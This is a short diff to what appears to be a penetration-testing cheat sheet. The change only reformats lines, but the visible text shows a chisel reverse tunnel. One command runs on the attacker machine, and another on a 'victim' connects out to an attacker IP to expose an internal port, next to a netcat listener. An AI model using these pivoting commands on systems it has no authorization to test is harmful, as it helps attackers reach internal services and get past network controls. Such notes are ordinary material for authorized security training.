@@ -187,17 +187,17 @@ netcat -l
 ```
 If 127.0.0.1:6666
 
-On attacker
+* On attacker
 ```sh
 apt-get install chisel
 # Copy chisel to victim
 chisel server --reverse --port 9002
 ```
-On victim
+* On victim
 ```sh
 ./chisel client 10.9.129.247:9002 R:9001:127.0.0.1:6666
 ```
-On attacker, go to `localhost:9001`
+* On attacker, go to `localhost:9001`
 
 
 ## Password Hack
